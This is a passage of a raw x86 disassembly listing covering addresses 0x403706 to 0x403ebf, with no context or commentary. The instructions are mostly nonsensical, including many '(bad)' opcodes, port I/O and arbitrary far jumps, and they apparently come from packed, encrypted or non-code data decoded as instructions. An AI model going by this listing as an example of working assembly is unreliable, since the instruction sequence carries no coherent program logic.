  403706:	jge    0x4036af
  403708:	lock cld 
  40370a:	cmp    edi,DWORD PTR [ebx+0x26]
  40370d:	push   ss
  40370e:	fcom   DWORD PTR [eax+0x5e]
  403711:	inc    edi
  403712:	and    dl,bh
  403714:	mov    bl,0x7f
  403716:	iret   
  403717:	sti    
  403718:	fstp   QWORD PTR [edi+0x26]
  40371b:	lock pop ebp
  40371d:	lahf   
  40371e:	mov    eax,0x8eb14810
  403723:	mov    ch,0x5e
  403725:	arpl   WORD PTR [ebp-0xac108bb],di
  40372b:	(bad)  
  40372c:	sahf   
  40372d:	mov    ah,0xd4
  40372f:	(bad)  
  403730:	mov    al,0xf4
  403732:	mov    al,0xa9
  403734:	pop    esi
  403735:	cmp    bl,BYTE PTR [ebx]
  403737:	jbe    0x403700
  403739:	mov    cl,0x80
  40373b:	fstp   DWORD PTR [esi+0x12]
  40373e:	and    esp,DWORD PTR [esi]
  403740:	adc    edx,DWORD PTR [ecx]
  403742:	popa   
  403743:	iret   
  403744:	jg     0x4037a6
  403746:	je     0x403764
  403748:	mov    bh,BYTE PTR [ecx]
  40374a:	iret   
  40374b:	add    ecx,DWORD PTR [esi+0x75faee6b]
  403751:	jbe    0x403732
  403753:	xor    BYTE PTR [ecx-0x11],al
  403756:	sbb    ah,BYTE PTR [ecx-0x22b89e40]
  40375c:	jns    0x40373d
  40375e:	dec    ebx
  40375f:	lds    ebx,FWORD PTR [esi-0x7a]
  403762:	outs   dx,BYTE PTR ds:[esi]
  403763:	jg     0x4036f5
  403765:	jg     0x403720
  403767:	mov    eax,ds:0xcea0429d
  40376c:	jl     0x4037ce
  40376e:	inc    edx
  40376f:	push   0x249d0ef0
  403774:	pop    esi
  403775:	repz ror BYTE PTR ds:0xc7a3b201,cl
  40377c:	pop    es
  40377d:	pop    edx
  40377e:	fst    QWORD PTR [ebp+0x21481f99]
  403784:	lea    ebx,[ecx+0x73]
  403787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403788:	pop    ebx
  403789:	test   al,0xfc
  40378b:	or     ebx,DWORD PTR [ebp-0x74]
  40378e:	mov    esi,0x7de3f7c6
  403793:	mov    eax,ds:0xf3d2d36
  403798:	jb     0x40379a
  40379a:	test   eax,0xadf25e30
  40379f:	xor    ebp,DWORD PTR [eax-0x63]
  4037a2:	test   eax,0xd560b115
  4037a7:	add    al,0x2a
  4037a9:	sub    bl,BYTE PTR [ecx]
  4037ab:	shl    DWORD PTR [ebp-0x612d1f1a],0xb2
  4037b2:	xchg   edi,eax
  4037b3:	cmp    edx,edi
  4037b5:	jnp    0x403821
  4037b7:	test   DWORD PTR [ecx+eiz*2],edx
  4037ba:	lahf   
  4037bb:	out    0x9c,eax
  4037bd:	(bad)  
  4037bf:	and    eax,0x88262e5f
  4037c4:	ret    0xc5e0
  4037c7:	sub    eax,0xddcb8285
  4037cc:	sub    al,0x61
  4037ce:	mov    ds:0xb372072f,al
  4037d3:	cld    
  4037d4:	mov    edi,0x8161ee9c
  4037d9:	ds (bad) 
  4037dc:	sar    BYTE PTR [ebx+edi*1-0xa7a3a5f],0xae
  4037e4:	rcr    BYTE PTR [esi],1
  4037e6:	push   0x84ee3432
  4037eb:	and    DWORD PTR [esi],ebp
  4037ed:	ja     0x403771
  4037ef:	and    bh,BYTE PTR [ebp-0x44867789]
  4037f5:	pusha  
  4037f6:	xchg   ebx,eax
  4037f7:	ins    DWORD PTR es:[edi],dx
  4037f8:	adc    edi,DWORD PTR [esi]
  4037fa:	sub    BYTE PTR [ebp-0x33],cl
  4037fd:	arpl   dx,bx
  4037ff:	or     eax,0xc1cd975e
  403804:	loope  0x403790
  403806:	dec    BYTE PTR [edi-0x13ba9778]
  40380c:	pusha  
  40380d:	out    0xce,al
  40380f:	and    edx,edx
  403811:	out    0xae,eax
  403813:	add    cl,BYTE PTR [ebx-0x4a]
  403816:	add    BYTE PTR [ebx-0x33d18be4],dl
  40381c:	jg     0x40385a
  40381e:	(bad)  
  40381f:	es lock push 0x60f81b50
  403826:	cmp    al,ch
  403828:	push   ebp
  403829:	jb     0x403849
  40382b:	cmp    BYTE PTR [ecx+0x6c2bee0e],bl
  403831:	into   
  403832:	(bad)  
  403833:	loopne 0x4037d5
  403835:	adc    eax,0xda91a17b
  40383a:	(bad)  
  40383b:	mov    ebx,0x690cc195
  403840:	cmp    ch,BYTE PTR [edx-0x27]
  403843:	(bad)  
  403844:	pop    esi
  403845:	data16 daa 
  403847:	and    cl,dh
  403849:	dec    cl
  40384b:	mov    al,ds:0x2801629c
  403850:	and    al,0xdf
  403852:	xchg   esp,eax
  403853:	pop    ebx
  403854:	neg    BYTE PTR [esi+ebp*8]
  403857:	pushf  
  403858:	arpl   WORD PTR [ecx],ax
  40385a:	adc    ah,cl
  40385c:	fistp  WORD PTR [edi-0x1d385ea8]
  403862:	imul   ecx,DWORD PTR [ebp+0x31],0x4c755330
  403869:	ret    
  40386a:	mov    ecx,0x94525eeb
  40386f:	ret    0xae1c
  403872:	mov    BYTE PTR [ebx+0xb5f1ea],ah
  403878:	lds    edi,FWORD PTR [esi+0x7bac682e]
  40387e:	jmp    0xde0e:0x2c27079f
  403885:	jg     0x403836
  403887:	imul   ecx,DWORD PTR [esi],0xcd49ba61
  40388d:	dec    ecx
  40388e:	call   0x3046:0x8ec96d79
  403895:	or     ch,dh
  403897:	or     BYTE PTR [ecx-0x62],ah
  40389a:	xchg   esi,eax
  40389b:	cmp    dh,BYTE PTR [eax+0x52a3cb03]
  4038a1:	sbb    ecx,DWORD PTR ds:0x5e2ff1f4
  4038a7:	inc    esi
  4038a8:	add    esp,ecx
  4038aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038ab:	jnp    0x40390b
  4038ad:	out    0x19,eax
  4038af:	lahf   
  4038b0:	stc    
  4038b1:	test   DWORD PTR [ecx+0x3612b28],edx
  4038b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038b8:	retf   0x2886
  4038bb:	pusha  
  4038bc:	in     eax,0xef
  4038be:	out    dx,al
  4038bf:	adc    BYTE PTR [ebp-0x45],dh
  4038c2:	or     DWORD PTR [esi*1-0x745f3377],esp
  4038c9:	adc    eax,ebp
  4038cb:	adc    al,0xf4
  4038cd:	xor    bh,BYTE PTR [edi]
  4038cf:	ins    DWORD PTR es:[edi],dx
  4038d0:	pop    esi
  4038d1:	push   ebx
  4038d2:	cmc    
  4038d3:	in     al,dx
  4038d4:	sti    
  4038d5:	mov    edx,0x605ca298
  4038da:	xor    BYTE PTR [edi+0x44],cl
  4038dd:	cld    
  4038de:	or     eax,0x4e40c323
  4038e3:	out    dx,al
  4038e4:	pop    esi
  4038e5:	mov    ah,dl
  4038e7:	lods   al,BYTE PTR ds:[esi]
  4038e8:	fimul  DWORD PTR [esi+0x7b]
  4038eb:	ror    BYTE PTR [ebp+0x5af07560],cl
  4038f1:	jae    0x403967
  4038f3:	push   ds
  4038f4:	cmp    eax,0xc914f099
  4038f9:	mov    al,ds:0xc50ba161
  4038fe:	loopne 0x403975
  403900:	gs popa 
  403902:	jne    0x403937
  403904:	ror    BYTE PTR ds:0x9f804a7b,1
  40390a:	out    dx,al
  40390b:	inc    edi
  40390c:	div    edi
  40390e:	fcom   st(6)
  403910:	test   DWORD PTR [ebp+0x59cdecf4],esp
  403916:	call   0x775a0801
  40391b:	jno    0x40389d
  40391d:	test   al,0xfc
  40391f:	xchg   DWORD PTR [esi+0x3b],ebx
  403922:	jbe    0x403953
  403924:	popf   
  403925:	es ss mov eax,0xae646166
  40392c:	scas   eax,DWORD PTR es:[edi]
  40392d:	mov    BYTE PTR [eax-0x110ec263],dl
  403933:	int3   
  403934:	das    
  403935:	cmp    al,0xc
  403937:	ins    DWORD PTR es:[edi],dx
  403938:	out    dx,eax
  403939:	cmp    al,0x0
  40393b:	lahf   
  40393c:	add    al,0xac
  40393e:	sbb    BYTE PTR [ecx+0x53],bl
  403941:	popa   
  403942:	push   0xc2945648
  403947:	mov    esi,0xd49c275e
  40394c:	loopne 0x4039bc
  40394e:	pop    esi
  40394f:	div    dh
  403951:	pop    ebp
  403952:	nop
  403953:	sub    BYTE PTR [ebx-0x614b75a4],cl
  403959:	and    edx,ebx
  40395b:	adc    ah,BYTE PTR [ebp-0x46]
  40395e:	ss cli 
  403960:	frstor [eax-0x53]
  403963:	test   BYTE PTR [ebp-0x105ec558],dh
  403969:	xor    ch,bl
  40396b:	jbe    0x40393f
  40396d:	cmp    eax,0x2c5ebb01
  403972:	jnp    0x40398d
  403974:	mov    ds:0xa7627c01,al
  403979:	push   ecx
  40397a:	xor    DWORD PTR [edx+edx*4-0x49],0xed2428b
  403982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403983:	mov    ah,0xaf
  403985:	rol    dh,1
  403987:	test   esp,edi
  403989:	pusha  
  40398a:	mov    ah,0x72
  40398c:	data16 out 0x89,al
  40398f:	idiv   BYTE PTR [ebx+0x63]
  403992:	(bad)
  403995:	into   
  403996:	scas   eax,DWORD PTR es:[edi]
  403997:	fadd   QWORD PTR [ebx]
  403999:	jle    0x403969
  40399b:	mov    eax,0x52ee03f6
  4039a0:	out    0xa1,eax
  4039a2:	and    ah,BYTE PTR [ebp+0x7b8c858c]
  4039a8:	mov    edx,0xb54ddd60
  4039ad:	cdq    
  4039ae:	stos   DWORD PTR es:[edi],eax
  4039af:	lds    ecx,FWORD PTR [ecx-0x5e89147c]
  4039b5:	mov    esi,0xed97f86f
  4039ba:	in     al,dx
  4039bb:	pop    ds
  4039bc:	push   cs
  4039bd:	adc    DWORD PTR [eax],ebp
  4039bf:	pcmpgtb mm3,QWORD PTR [esi-0x2c]
  4039c3:	xchg   edx,eax
  4039c4:	jo     0x4039b7
  4039c6:	add    edx,DWORD PTR [ecx-0x77590692]
  4039cc:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4039ce:	prefetch BYTE PTR [ebx]
  4039d1:	xor    edi,DWORD PTR [ecx]
  4039d3:	rcl    DWORD PTR [eax-0x1b],0xb0
  4039d7:	clc    
  4039d8:	(bad)  
  4039d9:	pusha  
  4039da:	mov    edx,0x4e11257c
  4039df:	pop    es
  4039e0:	mov    ds:0x3bffeb4a,eax
  4039e5:	int3   
  4039e6:	sar    BYTE PTR [eax-0x72],1
  4039e9:	mov    al,0x40
  4039eb:	data16 (bad) 
  4039ed:	pusha  
  4039ee:	lods   al,BYTE PTR ds:[si]
  4039f0:	stos   BYTE PTR es:[edi],al
  4039f1:	fdivr  QWORD PTR [eax+ebp*4+0xeee8462]
  4039f8:	dec    ebp
  4039f9:	adc    ch,BYTE PTR [edx]
  4039fb:	imul   ebp,DWORD PTR [esi+0x64],0xd95aa19c
  403a02:	cmp    eax,0xfffffff7
  403a05:	jmp    0xa8d:0xba5eb24c
  403a0c:	cwde   
  403a0d:	xchg   ebx,eax
  403a0e:	pop    ebx
  403a0f:	push   cs
  403a10:	fbstp  TBYTE PTR [eax+0x46]
  403a13:	jmp    0xd2098574
  403a18:	pop    esi
  403a19:	xor    DWORD PTR [ecx],edx
  403a1b:	jnp    0x403a8a
  403a1d:	mov    esp,0x61433065
  403a22:	adc    edx,esi
  403a24:	lods   eax,DWORD PTR ds:[esi]
  403a25:	gs push cs
  403a27:	cs inc eax
  403a29:	fs pop esp
  403a2b:	in     al,0x5e
  403a2d:	aam    0xc4
  403a2f:	xchg   ebp,eax
  403a30:	mov    dh,0x2d
  403a32:	rcl    DWORD PTR [ecx+0x4a],cl
  403a35:	popa   
  403a36:	inc    edi
  403a37:	jno    0x403a8a
  403a39:	jnp    0x403ab8
  403a3b:	cli    
  403a3c:	mov    esi,0x8356eec8
  403a41:	imul   edi,DWORD PTR [edx-0x22],0xa1657489
  403a48:	add    eax,esp
  403a4a:	ror    DWORD PTR [esi-0x5aabcb7e],0x5e
  403a51:	loope  0x403aca
  403a53:	stc    
  403a54:	push   0x9360082f
  403a59:	push   ebp
  403a5a:	adc    DWORD PTR [esp+esi*2-0x76],0x70
  403a5f:	mov    dl,0x7e
  403a61:	addr16 xchg edi,eax
  403a63:	xor    DWORD PTR [esi+0x25],edi
  403a66:	out    dx,al
  403a67:	rcl    BYTE PTR [ebp+0x31],0x6d
  403a6b:	jmp    0xfaf2:0xa224e8f0
  403a72:	pop    ebx
  403a73:	dec    edx
  403a74:	inc    eax
  403a75:	pop    edi
  403a76:	or     DWORD PTR [ecx+0x7feb77cd],eax
  403a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a7d:	or     ebp,DWORD PTR [ebp-0x43]
  403a80:	or     BYTE PTR [ecx+0x6125fd43],bl
  403a86:	inc    edi
  403a87:	mov    ss,edi
  403a89:	xor    eax,0xea561455
  403a8e:	add    edx,edx
  403a90:	jmp    0x403a6a
  403a92:	daa    
  403a93:	cmp    ebp,edi
  403a95:	fwait
  403a96:	outs   dx,BYTE PTR ds:[esi]
  403a97:	pop    ebp
  403a98:	(bad)  
  403a9a:	in     eax,dx
  403a9b:	mov    al,ds:0xffb583b1
  403aa0:	sub    edi,ebx
  403aa2:	je     0x403a72
  403aa4:	pop    esi
  403aa5:	rol    edi,cl
  403aa7:	loope  0x403a93
  403aa9:	rcl    DWORD PTR [edx],cl
  403aab:	mov    cl,0xe9
  403aad:	push   ecx
  403aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aaf:	in     al,0xc6
  403ab1:	xchg   esp,eax
  403ab2:	out    dx,al
  403ab3:	cmp    DWORD PTR [edi+edi*1-0x62a13c17],ebx
  403aba:	jb     0x403aa9
  403abc:	or     DWORD PTR [esi],0x1
  403abf:	lods   eax,DWORD PTR ds:[esi]
  403ac0:	and    BYTE PTR [ebp+0x44ea185],dh
  403ac6:	sub    ebp,DWORD PTR [ebp+0x4c]
  403ac9:	ret    
  403aca:	xchg   ecx,eax
  403acb:	and    al,0x5d
  403acd:	push   ebx
  403ace:	outs   dx,BYTE PTR ds:[esi]
  403acf:	dec    ebx
  403ad0:	pop    ebp
  403ad1:	or     ecx,DWORD PTR [ecx+0x3e563de1]
  403ad7:	mov    cs,edx
  403ad9:	pop    ebp
  403ada:	cmp    eax,0x1c94a74d
  403adf:	in     eax,0x7e
  403ae1:	cmp    DWORD PTR [edx],eax
  403ae3:	sbb    eax,0xf7d2685e
  403ae8:	ss retf 0x128d
  403aec:	out    0x60,eax
  403aee:	call   0xedd5:0x4efaac9a
  403af5:	js     0x403ae5
  403af7:	xor    esi,DWORD PTR ds:0xf0013973
  403afd:	and    DWORD PTR [edi+0x60d472a0],edi
  403b03:	jo     0x403af9
  403b05:	mov    ds:0xe2895ead,ax
  403b0b:	jno    0x403ab8
  403b0d:	outs   dx,BYTE PTR ds:[esi]
  403b0e:	mov    dh,0xd3
  403b10:	jmp    0x28d:0x35fa1560
  403b17:	arpl   di,bx
  403b19:	clc    
  403b1a:	add    ch,BYTE PTR [eax+0x7]
  403b1d:	push   edx
  403b1e:	shl    BYTE PTR [ebx+0x5e],0xed
  403b22:	ja     0x403b37
  403b24:	sbb    ebp,DWORD PTR [ebx]
  403b26:	test   al,0x8f
  403b28:	in     eax,dx
  403b29:	add    BYTE PTR [ebp-0x325f63df],al
  403b2f:	cdq    
  403b30:	scas   eax,DWORD PTR es:[edi]
  403b31:	xchg   ebx,eax
  403b32:	out    dx,al
  403b33:	sub    bh,BYTE PTR [esi]
  403b35:	stos   BYTE PTR es:[edi],al
  403b36:	repnz or al,0xa5
  403b39:	imul   edx,DWORD PTR [edi-0x52f9555f],0xbc783688
  403b43:	cdq    
  403b44:	pop    esi
  403b45:	ja     0x403b72
  403b47:	pop    ds
  403b48:	mov    WORD PTR [esi+0x60ef11be],gs
  403b4e:	cwde   
  403b4f:	scas   eax,DWORD PTR es:[edi]
  403b50:	mov    esi,DWORD PTR [edx-0x21aa4841]
  403b56:	out    dx,al
  403b57:	(bad)  
  403b5b:	aad    0xca
  403b5d:	out    0x12,eax
  403b5f:	mov    eax,ds:0x84c3ecac
  403b64:	retf   
  403b65:	out    dx,eax
  403b66:	push   edi
  403b67:	fs pop ecx
  403b69:	loop   0x403bdf
  403b6b:	(bad)  
  403b6c:	adc    eax,0x4af58ec7
  403b71:	pop    esi
  403b72:	push   0x73
  403b74:	dec    edi
  403b75:	pop    ds
  403b76:	fadd   QWORD PTR [ecx]
  403b78:	mov    ss,WORD PTR [eax-0x28a1642b]
  403b7e:	fisttp WORD PTR [esi]
  403b80:	mov    dl,0x75
  403b82:	sahf   
  403b83:	popf   
  403b84:	outs   dx,BYTE PTR ds:[esi]
  403b85:	pusha  
  403b86:	xchg   BYTE PTR [ecx-0xbdbf50],cl
  403b8c:	mov    dl,BYTE PTR [ebx+0x4d5eb74a]
  403b92:	jo     0x403ba6
  403b94:	cmp    dh,BYTE PTR [ebp+0x36]
  403b97:	xchg   ecx,eax
  403b98:	or     DWORD PTR [ecx-0x4c],esp
  403b9b:	pop    edx
  403b9c:	stc    
  403b9d:	mov    ds,edi
  403b9f:	mov    ecx,DWORD PTR ds:0xa6afb206
  403ba5:	push   edx
  403ba6:	dec    edi
  403ba7:	push   0xf
  403ba9:	popa   
  403baa:	retf   
  403bab:	cs dec ebp
  403bad:	dec    ebp
  403bae:	repz mov al,ds:0xd0c60ca6
  403bb4:	hlt    
  403bb5:	add    BYTE PTR [ecx],cl
  403bb7:	loope  0x403b67
  403bb9:	(bad)  
  403bba:	push   edx
  403bbb:	pop    ebx
  403bbc:	pop    esi
  403bbd:	ss stos BYTE PTR es:[edi],al
  403bbf:	adc    DWORD PTR [ecx+0x4ad321be],esi
  403bc5:	pop    esi
  403bc6:	sbb    al,BYTE PTR [ebx]
  403bc8:	call   0x50ca:0xd6dfd70d
  403bcf:	or     bl,BYTE PTR [esi-0x66]
  403bd2:	xchg   edi,eax
  403bd3:	adc    ecx,esi
  403bd5:	int    0xb8
  403bd7:	jl     0x403b92
  403bd9:	pusha  
  403bda:	jno    0x403bc2
  403bdc:	ins    BYTE PTR es:[edi],dx
  403bdd:	cmp    BYTE PTR [eax],bl
  403bdf:	mov    ?,WORD PTR [edx]
  403be1:	push   esp
  403be2:	out    dx,eax
  403be3:	jecxz  0x403bd1
  403be5:	lea    ebx,[ecx-0x1f]
  403be8:	mov    cl,0x32
  403bea:	mov    ecx,0xec5dc54a
  403bef:	cmp    al,0xf6
  403bf1:	out    dx,al
  403bf2:	or     ecx,edi
  403bf4:	mov    dh,0x56
  403bf6:	sbb    DWORD PTR [esi+ebx*2-0x40b2ac9e],edi
  403bfd:	cwde   
  403bfe:	fdivr  st(5),st
  403c00:	jmp    0x499a:0x5c31260
  403c07:	aas    
  403c08:	test   DWORD PTR [esi+0x522e36ee],ebp
  403c0e:	gs sbb eax,0xa179b411
  403c14:	inc    esp
  403c15:	arpl   bx,bp
  403c17:	stos   BYTE PTR es:[edi],al
  403c18:	shl    DWORD PTR [edi+ebx*4-0x2d],cl
  403c1c:	push   ecx
  403c1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c1e:	test   eax,0xa59d1ede
  403c23:	mov    bl,0x2f
  403c25:	mov    ebp,0x7d0aa1a2
  403c2a:	cdq    
  403c2b:	(bad)  
  403c2c:	jecxz  0x403c60
  403c2e:	test   al,0xca
  403c30:	pop    edi
  403c31:	lods   eax,DWORD PTR ds:[esi]
  403c32:	push   esp
  403c33:	adc    al,0x87
  403c35:	sbb    BYTE PTR [esi],bl
  403c37:	push   ecx
  403c38:	dec    edx
  403c39:	fldenv [ecx-0x5f]
  403c3c:	test   eax,0xf76bef74
  403c41:	enter  0xd81b,0x53
  403c45:	sub    ecx,DWORD PTR [eax+0x6f501b1f]
  403c4b:	mov    edx,0x5b1eb07e
  403c50:	call   0x2d8f:0xbd99cf60
  403c57:	push   eax
  403c58:	ror    DWORD PTR [ecx+eax*1],cl
  403c5b:	pop    ds
  403c5c:	mov    ah,0x43
  403c5e:	outs   dx,BYTE PTR ds:[esi]
  403c5f:	pop    DWORD PTR [ebp-0x3682f7f2]
  403c65:	pusha  
  403c66:	in     al,dx
  403c67:	pop    ds
  403c68:	cmp    bh,ah
  403c6a:	inc    edx
  403c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c6c:	mov    eax,ds:0x5edde365
  403c71:	les    esi,FWORD PTR [edx+0x2a]
  403c74:	ins    BYTE PTR es:[edi],dx
  403c75:	das    
  403c76:	push   es
  403c77:	push   edx
  403c78:	xor    al,0x5e
  403c7a:	nop
  403c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c7c:	jo     0x403c84
  403c7e:	push   esi
  403c7f:	(bad)  
  403c80:	jle    0x403cc8
  403c82:	mov    cl,0x67
  403c84:	pop    esi
  403c85:	sbb    al,0xf7
  403c87:	fisub  DWORD PTR [eax-0x3fbae8ae]
  403c8d:	popa   
  403c8e:	call   0xe22b:0xaf2ede9b
  403c95:	iret   
  403c96:	jecxz  0x403ce7
  403c98:	jle    0x403c6f
  403c9a:	out    dx,al
  403c9b:	dec    ecx
  403c9c:	pop    edi
  403c9d:	outs   dx,DWORD PTR ds:[esi]
  403c9e:	clc    
  403c9f:	sub    al,BYTE PTR [edx-0x7d]
  403ca2:	sahf   
  403ca3:	mov    eax,ds:0x6a6a282a
  403ca8:	scas   eax,DWORD PTR es:[edi]
  403ca9:	xor    al,0x48
  403cab:	sbb    bl,BYTE PTR [esi-0x9]
  403cae:	pusha  
  403caf:	xor    bl,BYTE PTR [ebx+0x3c]
  403cb2:	data16 sti 
  403cb4:	pop    edx
  403cb5:	popa   
  403cb6:	mov    ecx,0x24ae666a
  403cbb:	fisub  WORD PTR [eax+0x5f39ddb3]
  403cc1:	retf   0x8504
  403cc4:	push   ebx
  403cc5:	push   esp
  403cc6:	push   ds
  403cc7:	imul   esp,DWORD PTR ds:0x4dea1d3c,0x4e01ed61
  403cd1:	ins    DWORD PTR es:[edi],dx
  403cd2:	and    DWORD PTR [eax-0x4d],edx
  403cd5:	mov    ecx,0xd413c900
  403cda:	out    dx,al
  403cdb:	sub    bl,bl
  403cdd:	rcl    DWORD PTR [ecx-0xa],1
  403ce0:	clc    
  403ce1:	fs ins DWORD PTR es:[edi],dx
  403ce3:	std    
  403ce4:	pop    esi
  403ce5:	outs   dx,BYTE PTR ds:[esi]
  403ce6:	pop    ds
  403ce7:	pop    esp
  403ce8:	popa   
  403ce9:	pop    ebp
  403cea:	ins    BYTE PTR es:[edi],dx
  403ceb:	test   DWORD PTR [ebp+ebx*1+0x63],esp
  403cef:	cmc    
  403cf0:	and    BYTE PTR [eax],0xd4
  403cf3:	jo     0x403ca7
  403cf5:	out    dx,eax
  403cf6:	mov    edi,0xe1b1a6a0
  403cfb:	(bad)  
  403cfd:	push   ss
  403cfe:	jae    0x403d61
  403d00:	pop    ebx
  403d01:	add    al,0xd3
  403d03:	dec    ebx
  403d04:	int    0xdb
  403d06:	push   ds
  403d07:	and    esi,DWORD PTR [ebp-0x1e]
  403d0a:	push   edi
  403d0b:	test   al,0xac
  403d0d:	icebp  
  403d0e:	repnz inc eax
  403d10:	in     al,dx
  403d11:	bound  ecx,QWORD PTR [esi-0x11]
  403d14:	pushf  
  403d15:	inc    esp
  403d16:	xor    al,0x54
  403d18:	in     al,dx
  403d19:	or     ecx,DWORD PTR [edx-0x67]
  403d1c:	pop    esi
  403d1d:	inc    edx
  403d1e:	mov    cl,0xef
  403d20:	ja     0x403d97
  403d22:	or     DWORD PTR [eax+ebp*8+0x60],0x77
  403d27:	outs   dx,BYTE PTR ds:[esi]
  403d28:	popf   
  403d29:	lods   eax,DWORD PTR ds:[esi]
  403d2a:	dec    ebx
  403d2b:	daa    
  403d2c:	test   eax,0xbc2eebb6
  403d31:	add    ebp,DWORD PTR [ebx+ecx*8-0x38]
  403d35:	loopne 0x403cf6
  403d37:	out    0x53,al
  403d39:	push   ebx
  403d3a:	ss cmp eax,0x40c70962
  403d40:	rcl    al,cl
  403d42:	(bad)  
  403d43:	clc    
  403d44:	cs test eax,0xa2277aee
  403d4a:	dec    ecx
  403d4b:	xchg   DWORD PTR [ebx-0x15eb954],eax
  403d51:	inc    esp
  403d52:	inc    ebp
  403d53:	sub    ah,bh
  403d55:	mov    ebx,DWORD PTR [ebx-0x5]
  403d58:	pop    esi
  403d59:	lahf   
  403d5a:	scas   eax,DWORD PTR es:[edi]
  403d5b:	loopne 0x403daa
  403d5d:	push   ebp
  403d5e:	hlt    
  403d5f:	mov    bl,al
  403d61:	push   ecx
  403d62:	inc    edi
  403d63:	fcomip st,st(0)
  403d65:	iret   
  403d66:	scas   al,BYTE PTR es:[edi]
  403d67:	jle    0x403d8e
  403d69:	add    esi,eax
  403d6b:	mov    al,0x5f
  403d6d:	ret    0x5d36
  403d70:	dec    ebp
  403d71:	sub    ebx,DWORD PTR [esi-0x55363bbf]
  403d77:	mov    al,ds:0xd4c6de8d
  403d7c:	and    edi,0xc45e534e
  403d82:	mul    ebx
  403d84:	mov    edx,0xd9d0dc73
  403d89:	push   0xb25d4b01
  403d8e:	jmp    0x403d88
  403d90:	and    al,0x30
  403d92:	fidiv  WORD PTR [eax+0x310141fa]
  403d98:	xchg   ecx,eax
  403d99:	test   BYTE PTR [esi],ch
  403d9b:	aas    
  403d9c:	shr    eax,0xa
  403d9f:	sub    al,0x22
  403da1:	popa   
  403da2:	ret    
  403da3:	ss fwait
  403da5:	mov    edx,0xdd9a602b
  403daa:	out    dx,al
  403dab:	ret    
  403dac:	xchg   BYTE PTR [edi],bl
  403dae:	scas   al,BYTE PTR es:[edi]
  403daf:	sbb    edx,DWORD PTR [edx*2-0x4b265786]
  403db6:	push   edi
  403db7:	cwde   
  403db8:	xor    eax,0x7b44ec01
  403dbd:	loopne 0x403da6
  403dbf:	xor    bl,BYTE PTR es:[ebx+0x5c]
  403dc3:	inc    edi
  403dc4:	sahf   
  403dc5:	xchg   edi,eax
  403dc6:	pushf  
  403dc7:	sti    
  403dc8:	sub    al,0x61
  403dca:	inc    ecx
  403dcb:	arpl   WORD PTR [ebp+0x7d],di
  403dce:	imul   eax,DWORD PTR [ebx+0x3e48749a],0x5e
  403dd5:	loop   0x403d6e
  403dd7:	inc    edx
  403dd8:	fidiv  DWORD PTR [edx]
  403dda:	ss cld 
  403ddc:	and    ah,BYTE PTR [ecx+0x6]
  403ddf:	or     BYTE PTR [eax+0x58],cl
  403de2:	pop    edx
  403de3:	jo     0x403e30
  403de5:	stc    
  403de6:	out    dx,al
  403de7:	pop    fs
  403de9:	xor    al,0xd5
  403deb:	add    al,0x43
  403ded:	icebp  
  403dee:	mov    dl,0xa0
  403df0:	mov    ecx,0xbf9e88f2
  403df5:	test   DWORD PTR [edi],eax
  403df7:	sub    DWORD PTR [ebx+ecx*1+0x5e],esp
  403dfb:	arpl   sp,cx
  403dfd:	mov    al,ds:0x19b42010
  403e02:	push   ss
  403e03:	mov    eax,ds:0xbadfd523
  403e08:	mov    esi,0x52b7e031
  403e0d:	mov    bl,0x35
  403e0f:	xchg   esi,eax
  403e10:	fisub  WORD PTR [esi]
  403e12:	mov    al,ds:0x8ba56133
  403e17:	mov    eax,ds:0x9472ff8a
  403e1c:	push   ebx
  403e1d:	add    al,BYTE PTR [ebp+0x525a5e70]
  403e23:	inc    ebx
  403e24:	and    eax,0x688dd45e
  403e29:	pop    esp
  403e2a:	fld    TBYTE PTR [ebx]
  403e2c:	inc    esi
  403e2d:	push   es
  403e2e:	aad    0x20
  403e30:	(bad)  
  403e31:	xchg   edx,eax
  403e32:	cld    
  403e33:	or     DWORD PTR [esi-0x7b],ebx
  403e36:	jmp    0xc8f8f4a6
  403e3b:	dec    ebp
  403e3c:	jo     0x403e9e
  403e3e:	pop    ebp
  403e3f:	mov    DWORD PTR [ecx],eax
  403e41:	and    eax,0xb763ffdf
  403e46:	in     al,dx
  403e47:	sub    ah,BYTE PTR [edi]
  403e49:	add    eax,0xc10470d2
  403e4e:	in     eax,0x62
  403e50:	out    dx,al
  403e51:	sub    eax,0x6beba0e8
  403e56:	rcl    DWORD PTR [esi-0x32552fe5],1
  403e5c:	pop    esi
  403e5d:	aaa    
  403e5e:	or     al,0x13
  403e60:	shl    BYTE PTR [eax+0x607005af],0xcb
  403e67:	dec    esi
  403e68:	cmp    dh,BYTE PTR [edx]
  403e6a:	dec    esi
  403e6b:	add    ebp,DWORD PTR [esi]
  403e6d:	cld    
  403e6e:	or     al,al
  403e70:	jno    0x403dfc
  403e72:	out    dx,al
  403e73:	in     al,0x4b
  403e75:	iret   
  403e76:	icebp  
  403e77:	jmp    0x87389f99
  403e7c:	in     eax,dx
  403e7d:	pop    ss
  403e7e:	fwait
  403e7f:	mov    ah,0xea
  403e81:	xchg   ecx,eax
  403e82:	out    dx,eax
  403e83:	out    dx,eax
  403e84:	ret    0x32e0
  403e87:	shl    DWORD PTR [ebx+0x1a],0x78
  403e8b:	daa    
  403e8c:	sub    eax,0x7835bf5a
  403e91:	jno    0x403ea9
  403e93:	add    DWORD PTR [esi],eax
  403e95:	js     0x403e75
  403e97:	js     0x403ef7
  403e99:	ins    BYTE PTR es:[edi],dx
  403e9a:	ret    
  403e9b:	pop    es
  403e9c:	jmp    0xa960:0x7dcdb79d
  403ea3:	sbb    esi,DWORD PTR [ecx]
  403ea5:	popf   
  403ea6:	das    
  403ea7:	add    al,0x6e
  403ea9:	into   
  403eaa:	mov    esi,0xed8b8258
  403eaf:	cwde   
  403eb0:	pop    ss
  403eb1:	shl    DWORD PTR [ecx+0x3a323814],cl
  403eb7:	pop    eax
  403eb8:	repz pusha 
  403eba:	gs mov ah,0xeb
  403ebd:	dec    ebx
  403ebe:	(bad)  
  403ebf:	(bad)  
